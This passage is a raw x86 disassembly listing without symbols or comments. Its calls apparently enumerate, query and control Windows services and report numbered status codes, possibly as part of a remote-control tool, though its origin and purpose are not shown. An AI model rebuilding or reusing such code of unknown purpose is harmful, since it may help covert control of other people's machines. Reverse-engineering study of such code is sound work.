  40a26f:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40a275:	e9 ed 02 00 00       	jmp    0x40a567
  40a27a:	6a 01                	push   $0x1
  40a27c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a27f:	e8 36 09 00 00       	call   0x40abba
  40a284:	83 ec 10             	sub    $0x10,%esp
  40a287:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a28a:	8b dc                	mov    %esp,%ebx
  40a28c:	50                   	push   %eax
  40a28d:	56                   	push   %esi
  40a28e:	57                   	push   %edi
  40a28f:	e8 26 09 00 00       	call   0x40abba
  40a294:	50                   	push   %eax
  40a295:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40a298:	50                   	push   %eax
  40a299:	e8 1a 24 00 00       	call   0x40c6b8
  40a29e:	83 c4 0c             	add    $0xc,%esp
  40a2a1:	50                   	push   %eax
  40a2a2:	53                   	push   %ebx
  40a2a3:	e8 10 24 00 00       	call   0x40c6b8
  40a2a8:	83 c4 0c             	add    $0xc,%esp
  40a2ab:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a2b0:	68 84 00 00 00       	push   $0x84
  40a2b5:	e8 70 6e ff ff       	call   0x40112a
  40a2ba:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40a2bd:	e9 a5 02 00 00       	jmp    0x40a567
  40a2c2:	57                   	push   %edi
  40a2c3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a2c6:	e8 ef 08 00 00       	call   0x40abba
  40a2cb:	83 ec 10             	sub    $0x10,%esp
  40a2ce:	8b cc                	mov    %esp,%ecx
  40a2d0:	50                   	push   %eax
  40a2d1:	51                   	push   %ecx
  40a2d2:	e8 23 10 00 00       	call   0x40b2fa
  40a2d7:	59                   	pop    %ecx
  40a2d8:	59                   	pop    %ecx
  40a2d9:	e8 f6 06 00 00       	call   0x40a9d4
  40a2de:	88 45 ec             	mov    %al,-0x14(%ebp)
  40a2e1:	8b dc                	mov    %esp,%ebx
  40a2e3:	ff 75 ec             	push   -0x14(%ebp)
  40a2e6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a2e9:	56                   	push   %esi
  40a2ea:	6a 01                	push   $0x1
  40a2ec:	e8 c9 08 00 00       	call   0x40abba
  40a2f1:	50                   	push   %eax
  40a2f2:	56                   	push   %esi
  40a2f3:	57                   	push   %edi
  40a2f4:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a2f7:	e8 be 08 00 00       	call   0x40abba
  40a2fc:	50                   	push   %eax
  40a2fd:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40a300:	50                   	push   %eax
  40a301:	e8 b2 23 00 00       	call   0x40c6b8
  40a306:	83 c4 0c             	add    $0xc,%esp
  40a309:	50                   	push   %eax
  40a30a:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40a310:	50                   	push   %eax
  40a311:	e8 a2 23 00 00       	call   0x40c6b8
  40a316:	83 c4 0c             	add    $0xc,%esp
  40a319:	50                   	push   %eax
  40a31a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40a31d:	50                   	push   %eax
  40a31e:	e8 95 23 00 00       	call   0x40c6b8
  40a323:	83 c4 0c             	add    $0xc,%esp
  40a326:	50                   	push   %eax
  40a327:	53                   	push   %ebx
  40a328:	e8 91 23 00 00       	call   0x40c6be
  40a32d:	83 c4 0c             	add    $0xc,%esp
  40a330:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a335:	6a 7f                	push   $0x7f
  40a337:	e8 ee 6d ff ff       	call   0x40112a
  40a33c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40a33f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a345:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40a34b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a351:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40a354:	e9 0e 02 00 00       	jmp    0x40a567
  40a359:	57                   	push   %edi
  40a35a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a35d:	e8 58 08 00 00       	call   0x40abba
  40a362:	83 ec 10             	sub    $0x10,%esp
  40a365:	8b cc                	mov    %esp,%ecx
  40a367:	50                   	push   %eax
  40a368:	51                   	push   %ecx
  40a369:	e8 8c 0f 00 00       	call   0x40b2fa
  40a36e:	59                   	pop    %ecx
  40a36f:	59                   	pop    %ecx
  40a370:	e8 58 07 00 00       	call   0x40aacd
  40a375:	83 c4 10             	add    $0x10,%esp
  40a378:	84 c0                	test   %al,%al
  40a37a:	74 45                	je     0x40a3c1
  40a37c:	6a 01                	push   $0x1
  40a37e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a381:	e8 34 08 00 00       	call   0x40abba
  40a386:	83 ec 10             	sub    $0x10,%esp
  40a389:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a38c:	8b dc                	mov    %esp,%ebx
  40a38e:	50                   	push   %eax
  40a38f:	56                   	push   %esi
  40a390:	57                   	push   %edi
  40a391:	e8 24 08 00 00       	call   0x40abba
  40a396:	50                   	push   %eax
  40a397:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40a39a:	50                   	push   %eax
  40a39b:	e8 18 23 00 00       	call   0x40c6b8
  40a3a0:	83 c4 0c             	add    $0xc,%esp
  40a3a3:	50                   	push   %eax
  40a3a4:	53                   	push   %ebx
  40a3a5:	e8 0e 23 00 00       	call   0x40c6b8
  40a3aa:	83 c4 0c             	add    $0xc,%esp
  40a3ad:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a3b2:	6a 7d                	push   $0x7d
  40a3b4:	e8 71 6d ff ff       	call   0x40112a
  40a3b9:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40a3bc:	e9 a6 01 00 00       	jmp    0x40a567
  40a3c1:	57                   	push   %edi
  40a3c2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a3c5:	e8 f0 07 00 00       	call   0x40abba
  40a3ca:	83 ec 10             	sub    $0x10,%esp
  40a3cd:	8b cc                	mov    %esp,%ecx
  40a3cf:	50                   	push   %eax
  40a3d0:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40a3d6:	68 83 00 00 00       	push   $0x83
  40a3db:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a3e0:	e8 45 6d ff ff       	call   0x40112a
  40a3e5:	e9 d6 01 00 00       	jmp    0x40a5c0
  40a3ea:	57                   	push   %edi
  40a3eb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a3ee:	e8 c7 07 00 00       	call   0x40abba
  40a3f3:	83 ec 10             	sub    $0x10,%esp
  40a3f6:	8b cc                	mov    %esp,%ecx
  40a3f8:	50                   	push   %eax
  40a3f9:	51                   	push   %ecx
  40a3fa:	e8 fb 0e 00 00       	call   0x40b2fa
  40a3ff:	59                   	pop    %ecx
  40a400:	59                   	pop    %ecx
  40a401:	e8 60 06 00 00       	call   0x40aa66
  40a406:	83 c4 10             	add    $0x10,%esp
  40a409:	84 c0                	test   %al,%al
  40a40b:	74 45                	je     0x40a452
  40a40d:	6a 01                	push   $0x1
  40a40f:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a412:	e8 a3 07 00 00       	call   0x40abba
  40a417:	83 ec 10             	sub    $0x10,%esp
  40a41a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a41d:	8b dc                	mov    %esp,%ebx
  40a41f:	50                   	push   %eax
  40a420:	56                   	push   %esi
  40a421:	57                   	push   %edi
  40a422:	e8 93 07 00 00       	call   0x40abba
  40a427:	50                   	push   %eax
  40a428:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40a42b:	50                   	push   %eax
  40a42c:	e8 87 22 00 00       	call   0x40c6b8
  40a431:	83 c4 0c             	add    $0xc,%esp
  40a434:	50                   	push   %eax
  40a435:	53                   	push   %ebx
  40a436:	e8 7d 22 00 00       	call   0x40c6b8
  40a43b:	83 c4 0c             	add    $0xc,%esp
  40a43e:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a443:	6a 7c                	push   $0x7c
  40a445:	e8 e0 6c ff ff       	call   0x40112a
  40a44a:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40a44d:	e9 15 01 00 00       	jmp    0x40a567
  40a452:	57                   	push   %edi
  40a453:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a456:	e8 5f 07 00 00       	call   0x40abba
  40a45b:	83 ec 10             	sub    $0x10,%esp
  40a45e:	8b cc                	mov    %esp,%ecx
  40a460:	50                   	push   %eax
  40a461:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40a467:	68 82 00 00 00       	push   $0x82
  40a46c:	e9 6a ff ff ff       	jmp    0x40a3db
  40a471:	57                   	push   %edi
  40a472:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a475:	e8 40 07 00 00       	call   0x40abba
  40a47a:	83 ec 10             	sub    $0x10,%esp
  40a47d:	8b cc                	mov    %esp,%ecx
  40a47f:	50                   	push   %eax
  40a480:	51                   	push   %ecx
  40a481:	e8 74 0e 00 00       	call   0x40b2fa
  40a486:	59                   	pop    %ecx
  40a487:	59                   	pop    %ecx
  40a488:	e8 e0 04 00 00       	call   0x40a96d
  40a48d:	83 c4 10             	add    $0x10,%esp
  40a490:	84 c0                	test   %al,%al
  40a492:	74 4b                	je     0x40a4df
  40a494:	6a 01                	push   $0x1
  40a496:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a499:	e8 1c 07 00 00       	call   0x40abba
  40a49e:	83 ec 10             	sub    $0x10,%esp
  40a4a1:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a4a4:	8b dc                	mov    %esp,%ebx
  40a4a6:	50                   	push   %eax
  40a4a7:	56                   	push   %esi
  40a4a8:	57                   	push   %edi
  40a4a9:	e8 0c 07 00 00       	call   0x40abba
  40a4ae:	50                   	push   %eax
  40a4af:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40a4b5:	50                   	push   %eax
  40a4b6:	e8 fd 21 00 00       	call   0x40c6b8
  40a4bb:	83 c4 0c             	add    $0xc,%esp
  40a4be:	50                   	push   %eax
  40a4bf:	53                   	push   %ebx
  40a4c0:	e8 f3 21 00 00       	call   0x40c6b8
  40a4c5:	83 c4 0c             	add    $0xc,%esp
  40a4c8:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a4cd:	6a 7b                	push   $0x7b
  40a4cf:	e8 56 6c ff ff       	call   0x40112a
  40a4d4:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40a4da:	e9 88 00 00 00       	jmp    0x40a567
  40a4df:	57                   	push   %edi
  40a4e0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a4e3:	e8 d2 06 00 00       	call   0x40abba
  40a4e8:	83 ec 10             	sub    $0x10,%esp
  40a4eb:	8b cc                	mov    %esp,%ecx
  40a4ed:	50                   	push   %eax
  40a4ee:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40a4f4:	68 81 00 00 00       	push   $0x81
  40a4f9:	e9 dd fe ff ff       	jmp    0x40a3db
  40a4fe:	57                   	push   %edi
  40a4ff:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a502:	e8 b3 06 00 00       	call   0x40abba
  40a507:	83 ec 10             	sub    $0x10,%esp
  40a50a:	8b cc                	mov    %esp,%ecx
  40a50c:	50                   	push   %eax
  40a50d:	51                   	push   %ecx
  40a50e:	e8 e7 0d 00 00       	call   0x40b2fa
  40a513:	59                   	pop    %ecx
  40a514:	59                   	pop    %ecx
  40a515:	e8 f3 03 00 00       	call   0x40a90d
  40a51a:	83 c4 10             	add    $0x10,%esp
  40a51d:	84 c0                	test   %al,%al
  40a51f:	74 4e                	je     0x40a56f
  40a521:	6a 01                	push   $0x1
  40a523:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a526:	e8 8f 06 00 00       	call   0x40abba
  40a52b:	83 ec 10             	sub    $0x10,%esp
  40a52e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a531:	8b dc                	mov    %esp,%ebx
  40a533:	50                   	push   %eax
  40a534:	56                   	push   %esi
  40a535:	57                   	push   %edi
  40a536:	e8 7f 06 00 00       	call   0x40abba
  40a53b:	50                   	push   %eax
  40a53c:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  40a542:	50                   	push   %eax
  40a543:	e8 70 21 00 00       	call   0x40c6b8
  40a548:	83 c4 0c             	add    $0xc,%esp
  40a54b:	50                   	push   %eax
  40a54c:	53                   	push   %ebx
  40a54d:	e8 66 21 00 00       	call   0x40c6b8
  40a552:	83 c4 0c             	add    $0xc,%esp
  40a555:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a55a:	6a 7a                	push   $0x7a
  40a55c:	e8 c9 6b ff ff       	call   0x40112a
  40a561:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  40a567:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a56d:	eb 51                	jmp    0x40a5c0
  40a56f:	57                   	push   %edi
  40a570:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a573:	e8 42 06 00 00       	call   0x40abba
  40a578:	83 ec 10             	sub    $0x10,%esp
  40a57b:	8b cc                	mov    %esp,%ecx
  40a57d:	50                   	push   %eax
  40a57e:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40a584:	68 80 00 00 00       	push   $0x80
  40a589:	e9 4d fe ff ff       	jmp    0x40a3db
  40a58e:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  40a594:	50                   	push   %eax
  40a595:	e8 3c 00 00 00       	call   0x40a5d6
  40a59a:	83 ec 0c             	sub    $0xc,%esp
  40a59d:	8b cc                	mov    %esp,%ecx
  40a59f:	50                   	push   %eax
  40a5a0:	51                   	push   %ecx
  40a5a1:	e8 28 0d 00 00       	call   0x40b2ce
  40a5a6:	59                   	pop    %ecx
  40a5a7:	59                   	pop    %ecx
  40a5a8:	6a 79                	push   $0x79
  40a5aa:	b9 10 1d 41 00       	mov    $0x411d10,%ecx
  40a5af:	e8 76 6b ff ff       	call   0x40112a
  40a5b4:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40a5ba:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a5c0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a5c3:	e8 68 75 ff ff       	call   0x401b30
  40a5c8:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40a5cb:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40a5d1:	5f                   	pop    %edi
  40a5d2:	5e                   	pop    %esi
  40a5d3:	5b                   	pop    %ebx
  40a5d4:	c9                   	leave
  40a5d5:	c3                   	ret
  40a5d6:	55                   	push   %ebp
  40a5d7:	8b ec                	mov    %esp,%ebp
  40a5d9:	81 ec 44 01 00 00    	sub    $0x144,%esp
  40a5df:	57                   	push   %edi
  40a5e0:	33 ff                	xor    %edi,%edi
  40a5e2:	6a 04                	push   $0x4
  40a5e4:	57                   	push   %edi
  40a5e5:	57                   	push   %edi
  40a5e6:	ff 15 20 d0 40 00    	call   *0x40d020
  40a5ec:	3b c7                	cmp    %edi,%eax
  40a5ee:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40a5f1:	75 1a                	jne    0x40a60d
  40a5f3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a5f6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40a5f9:	50                   	push   %eax
  40a5fa:	68 b8 d8 40 00       	push   $0x40d8b8
  40a5ff:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40a605:	8b 45 08             	mov    0x8(%ebp),%eax
  40a608:	e9 fd 02 00 00       	jmp    0x40a90a
  40a60d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40a610:	56                   	push   %esi
  40a611:	50                   	push   %eax
  40a612:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a615:	ff 15 20 d2 40 00    	call   *0x40d220
  40a61b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40a61e:	8b 35 24 d0 40 00    	mov    0x40d024,%esi
  40a624:	50                   	push   %eax
  40a625:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40a628:	50                   	push   %eax
  40a629:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40a62c:	50                   	push   %eax
  40a62d:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  40a633:	57                   	push   %edi
  40a634:	50                   	push   %eax
  40a635:	6a 03                	push   $0x3
  40a637:	6a 3b                	push   $0x3b
  40a639:	ff 75 f4             	push   -0xc(%ebp)
  40a63c:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40a63f:	89 7d f8             	mov    %edi,-0x8(%ebp)
  40a642:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40a645:	ff d6                	call   *%esi
  40a647:	85 c0                	test   %eax,%eax
  40a649:	0f 85 98 02 00 00    	jne    0x40a8e7
  40a64f:	ff 15 14 d1 40 00    	call   *0x40d114
  40a655:	3d ea 00 00 00       	cmp    $0xea,%eax
  40a65a:	0f 85 87 02 00 00    	jne    0x40a8e7
  40a660:	53                   	push   %ebx
  40a661:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  40a664:	53                   	push   %ebx
  40a665:	ff 15 7c d3 40 00    	call   *0x40d37c
  40a66b:	59                   	pop    %ecx
  40a66c:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40a66f:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40a672:	51                   	push   %ecx
  40a673:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  40a676:	51                   	push   %ecx
  40a677:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40a67a:	51                   	push   %ecx
  40a67b:	53                   	push   %ebx
  40a67c:	50                   	push   %eax
  40a67d:	6a 03                	push   $0x3
  40a67f:	6a 3b                	push   $0x3b
  40a681:	ff 75 f4             	push   -0xc(%ebp)
  40a684:	ff d6                	call   *%esi
  40a686:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  40a689:	89 7d ec             	mov    %edi,-0x14(%ebp)
  40a68c:	0f 86 4a 02 00 00    	jbe    0x40a8dc
  40a692:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  40a695:	8b 7d 08             	mov    0x8(%ebp),%edi
  40a698:	be 34 de 40 00       	mov    $0x40de34,%esi
  40a69d:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40a6a0:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  40a6a6:	50                   	push   %eax
  40a6a7:	56                   	push   %esi
  40a6a8:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40a6ae:	50                   	push   %eax
  40a6af:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40a6b2:	ff 73 04             	push   0x4(%ebx)
  40a6b5:	50                   	push   %eax
  40a6b6:	e8 21 20 00 00       	call   0x40c6dc
  40a6bb:	83 c4 0c             	add    $0xc,%esp
  40a6be:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a6c1:	50                   	push   %eax
  40a6c2:	ff 15 18 d2 40 00    	call   *0x40d218
  40a6c8:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40a6cb:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a6d1:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  40a6d7:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a6dd:	8d 45 e2             	lea    -0x1e(%ebp),%eax
  40a6e0:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  40a6e6:	50                   	push   %eax
  40a6e7:	56                   	push   %esi
  40a6e8:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40a6ee:	50                   	push   %eax
  40a6ef:	8d 45 80             	lea    -0x80(%ebp),%eax
  40a6f2:	ff 33                	push   (%ebx)
  40a6f4:	50                   	push   %eax
  40a6f5:	e8 e2 1f 00 00       	call   0x40c6dc
  40a6fa:	83 c4 0c             	add    $0xc,%esp
  40a6fd:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a700:	50                   	push   %eax
  40a701:	ff 15 18 d2 40 00    	call   *0x40d218
  40a707:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40a70a:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a710:	8d 8d 20 ff ff ff    	lea    -0xe0(%ebp),%ecx
  40a716:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a71c:	8d 45 e3             	lea    -0x1d(%ebp),%eax
  40a71f:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  40a725:	50                   	push   %eax
  40a726:	56                   	push   %esi
  40a727:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40a72d:	50                   	push   %eax
  40a72e:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  40a734:	ff 73 0c             	push   0xc(%ebx)
  40a737:	50                   	push   %eax
  40a738:	e8 92 0a 00 00       	call   0x40b1cf
  40a73d:	59                   	pop    %ecx
  40a73e:	59                   	pop    %ecx
  40a73f:	50                   	push   %eax
  40a740:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40a746:	50                   	push   %eax
  40a747:	e8 84 1f 00 00       	call   0x40c6d0
  40a74c:	83 c4 0c             	add    $0xc,%esp
  40a74f:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a752:	50                   	push   %eax
  40a753:	ff 15 18 d2 40 00    	call   *0x40d218
  40a759:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40a75f:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a765:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  40a76b:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a771:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  40a777:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a77d:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40a781:	6a 01                	push   $0x1
  40a783:	ff 33                	push   (%ebx)
  40a785:	ff 75 f4             	push   -0xc(%ebp)
  40a788:	ff 15 28 d0 40 00    	call   *0x40d028
  40a78e:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40a791:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40a794:	51                   	push   %ecx
  40a795:	6a 00                	push   $0x0
  40a797:	57                   	push   %edi
  40a798:	50                   	push   %eax
  40a799:	ff 15 74 d0 40 00    	call   *0x40d074
  40a79f:	85 c0                	test   %eax,%eax
  40a7a1:	0f 85 1a 01 00 00    	jne    0x40a8c1
  40a7a7:	ff 15 14 d1 40 00    	call   *0x40d114
  40a7ad:	83 f8 7a             	cmp    $0x7a,%eax
  40a7b0:	0f 85 0b 01 00 00    	jne    0x40a8c1
  40a7b6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40a7b9:	50                   	push   %eax
  40a7ba:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40a7bd:	ff 15 7c d3 40 00    	call   *0x40d37c
  40a7c3:	8b f8                	mov    %eax,%edi
  40a7c5:	59                   	pop    %ecx
  40a7c6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40a7c9:	50                   	push   %eax
  40a7ca:	ff 75 c0             	push   -0x40(%ebp)
  40a7cd:	57                   	push   %edi
  40a7ce:	ff 75 d4             	push   -0x2c(%ebp)
  40a7d1:	ff 15 74 d0 40 00    	call   *0x40d074
  40a7d7:	56                   	push   %esi
  40a7d8:	8d 45 90             	lea    -0x70(%ebp),%eax
  40a7db:	ff 37                	push   (%edi)
  40a7dd:	50                   	push   %eax
  40a7de:	e8 ec 09 00 00       	call   0x40b1cf
  40a7e3:	59                   	pop    %ecx
  40a7e4:	59                   	pop    %ecx
  40a7e5:	50                   	push   %eax
  40a7e6:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40a7e9:	50                   	push   %eax
  40a7ea:	e8 db 1e 00 00       	call   0x40c6ca
  40a7ef:	83 c4 0c             	add    $0xc,%esp
  40a7f2:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a7f5:	50                   	push   %eax
  40a7f6:	ff 15 18 d2 40 00    	call   *0x40d218
  40a7fc:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40a7ff:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a805:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40a808:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a80e:	56                   	push   %esi
  40a80f:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  40a815:	ff 77 04             	push   0x4(%edi)
  40a818:	50                   	push   %eax
  40a819:	e8 b1 09 00 00       	call   0x40b1cf
  40a81e:	59                   	pop    %ecx
  40a81f:	59                   	pop    %ecx
  40a820:	50                   	push   %eax
  40a821:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40a827:	50                   	push   %eax
  40a828:	e8 9d 1e 00 00       	call   0x40c6ca
  40a82d:	83 c4 0c             	add    $0xc,%esp
  40a830:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a833:	50                   	push   %eax
  40a834:	ff 15 18 d2 40 00    	call   *0x40d218
  40a83a:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  40a840:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a846:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  40a84c:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a852:	8d 45 eb             	lea    -0x15(%ebp),%eax
  40a855:	68 30 d9 40 00       	push   $0x40d930
  40a85a:	50                   	push   %eax
  40a85b:	56                   	push   %esi
  40a85c:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40a862:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40a868:	50                   	push   %eax
  40a869:	8d 85 10 ff ff ff    	lea    -0xf0(%ebp),%eax
  40a86f:	ff 77 0c             	push   0xc(%edi)
  40a872:	50                   	push   %eax
  40a873:	e8 64 1e 00 00       	call   0x40c6dc
  40a878:	83 c4 0c             	add    $0xc,%esp
  40a87b:	50                   	push   %eax
  40a87c:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  40a882:	50                   	push   %eax
  40a883:	e8 42 1e 00 00       	call   0x40c6ca
  40a888:	83 c4 0c             	add    $0xc,%esp
  40a88b:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a88e:	50                   	push   %eax
  40a88f:	ff 15 18 d2 40 00    	call   *0x40d218
  40a895:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  40a89b:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a8a1:	8d 8d 10 ff ff ff    	lea    -0xf0(%ebp),%ecx
  40a8a7:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a8ad:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40a8b3:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a8b9:	57                   	push   %edi
  40a8ba:	ff 15 80 d3 40 00    	call   *0x40d380
  40a8c0:	59                   	pop    %ecx
  40a8c1:	ff 75 d4             	push   -0x2c(%ebp)
  40a8c4:	ff 15 70 d0 40 00    	call   *0x40d070
  40a8ca:	ff 45 ec             	incl   -0x14(%ebp)
  40a8cd:	83 c3 24             	add    $0x24,%ebx
  40a8d0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40a8d3:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  40a8d6:	0f 82 c1 fd ff ff    	jb     0x40a69d
  40a8dc:	ff 75 d8             	push   -0x28(%ebp)
  40a8df:	ff 15 80 d3 40 00    	call   *0x40d380
  40a8e5:	59                   	pop    %ecx
  40a8e6:	5b                   	pop    %ebx
  40a8e7:	ff 75 f4             	push   -0xc(%ebp)
  40a8ea:	ff 15 70 d0 40 00    	call   *0x40d070
  40a8f0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40a8f3:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40a8f6:	50                   	push   %eax
  40a8f7:	ff 15 34 d2 40 00    	call   *0x40d234
  40a8fd:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40a900:	ff 15 9c d2 40 00    	call   *0x40d29c
  40a906:	8b 45 08             	mov    0x8(%ebp),%eax
  40a909:	5e                   	pop    %esi
  40a90a:	5f                   	pop    %edi
  40a90b:	c9                   	leave
  40a90c:	c3                   	ret
  40a90d:	55                   	push   %ebp
  40a90e:	8b ec                	mov    %esp,%ebp
  40a910:	53                   	push   %ebx
  40a911:	56                   	push   %esi
  40a912:	57                   	push   %edi
  40a913:	33 db                	xor    %ebx,%ebx
  40a915:	6a 10                	push   $0x10
  40a917:	53                   	push   %ebx
  40a918:	53                   	push   %ebx
  40a919:	ff 15 18 d0 40 00    	call   *0x40d018
  40a91f:	6a 10                	push   $0x10
  40a921:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40a924:	8b f0                	mov    %eax,%esi
  40a926:	ff 15 98 d2 40 00    	call   *0x40d298
  40a92c:	50                   	push   %eax
  40a92d:	56                   	push   %esi
  40a92e:	ff 15 28 d0 40 00    	call   *0x40d028
  40a934:	8b f8                	mov    %eax,%edi
  40a936:	3b fb                	cmp    %ebx,%edi
  40a938:	75 09                	jne    0x40a943
  40a93a:	56                   	push   %esi
  40a93b:	ff 15 70 d0 40 00    	call   *0x40d070
  40a941:	eb 1a                	jmp    0x40a95d
  40a943:	53                   	push   %ebx
  40a944:	53                   	push   %ebx
  40a945:	57                   	push   %edi
  40a946:	ff 15 1c d0 40 00    	call   *0x40d01c
